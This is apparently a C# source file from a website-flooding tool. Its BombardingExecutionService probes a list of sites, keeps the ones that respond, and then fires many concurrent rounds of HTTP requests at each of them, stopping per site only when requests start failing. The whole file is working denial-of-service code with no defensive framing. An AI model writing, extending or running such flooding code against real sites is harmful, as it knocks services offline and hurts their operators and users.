using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Threading;
using System.Threading.Tasks;
using Core.Abstractions;
using Microsoft.Extensions.Logging;

namespace Core;

public class BombardingExecutionService : IBombardingExecutionService
{
    private readonly ILogger<BombardingExecutionService> _logger;   
    private readonly ISiteBombardService _siteBombardService;
    private readonly ISiteRetriever _siteRetriever;
    private readonly IHttpClientFactory _httpClientFactory;

    private readonly ConcurrentDictionary<string, bool> _siteCollection = new();

    public BombardingExecutionService(ILogger<BombardingExecutionService> logger, 
        ISiteBombardService siteBombardService, 
        ISiteRetriever siteRetriever, 
        IHttpClientFactory httpClientFactory)
    {
        _logger = logger;
        _siteBombardService = siteBombardService;
        _siteRetriever = siteRetriever;
        _httpClientFactory = httpClientFactory;
    }

    public async Task ExecuteAsync()
    {
        _logger.LogInformation("Executing process ...");
        var sites = await _siteRetriever.GetSitesAsync();

        var tasks = await GetSitesForBombardingAsync(sites);

        await Task.WhenAll(tasks);

        _logger.LogInformation("Process executed");
    }

    private ValueTask<IEnumerable<Task>> GetSitesForBombardingAsync(IEnumerable<string> urls)
    {
        var cancellationSource = new CancellationTokenSource();

        var client = _httpClientFactory.CreateClient("sites");
        
        var firstShootList = urls.Select(url => MakeFirstShootAsync(url, client)).ToArray();

        Task.WaitAll(firstShootList);
        
        var bombardingTaskList = new List<Task>(Constants.IterationsCount * _siteCollection.Count);

        if (_siteCollection.IsEmpty)
        {
            return new ValueTask<IEnumerable<Task>>(Enumerable.Empty<Task>());
        }

        _logger.LogInformation($"Ready to pulling sites: {_siteCollection.Count}");

        for (var i = 0; i < Constants.IterationsCount; i++)
        {
            bombardingTaskList.AddRange(_siteCollection.Select(site => site.Key).Select(url => MakeRequestAsync(url, client, cancellationSource)));
        }

        return new ValueTask<IEnumerable<Task>>(bombardingTaskList);
    }

    private async Task MakeFirstShootAsync(string url, HttpMessageInvoker client)
    {
        var isSuccess = await _siteBombardService.MakeRequestAsync(url, client, CancellationToken.None);

        if (isSuccess)
        {
            _siteCollection.TryAdd(url, true);
        }
    }

    private async Task MakeRequestAsync(string url, HttpMessageInvoker client, CancellationTokenSource cancellationSource)
    {
        if (cancellationSource.IsCancellationRequested)
        {
            return;
        }

        if (!_siteCollection.TryGetValue(url, out var success) || !success)
        {
            return;
        }
        
        var result = await _siteBombardService.MakeRequestAsync(url, client, cancellationSource.Token);

        if (!result)
        {
            cancellationSource.Cancel();
            _siteCollection.TryUpdate(url, false, false);
        }
    }
}